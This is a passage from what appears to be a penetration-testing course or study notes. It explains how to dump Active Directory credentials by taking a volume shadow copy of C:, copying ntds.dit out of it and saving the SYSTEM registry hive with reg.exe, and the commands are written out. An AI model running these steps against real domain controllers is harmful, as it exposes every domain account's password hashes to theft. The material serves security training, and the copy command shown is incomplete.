> Listing 862 - Permforming a Shadow Copy of the entire drive C

Once the snapshot has been taken successfully, we will need the shadow copy name

Now we'll copy the AD Database from the shadow copy to the C: drive root folder by specifying the shadow copy name and the full ntds.dit

```
C:\Tools copy \\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit

```

> Listing 863 - Copying the ntds data to the c drive

As a last ingredient, to extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the reg utility and save the argument.

```
C:\reg.exe save hklm\system system.hiv
The operation completed successfully.
```
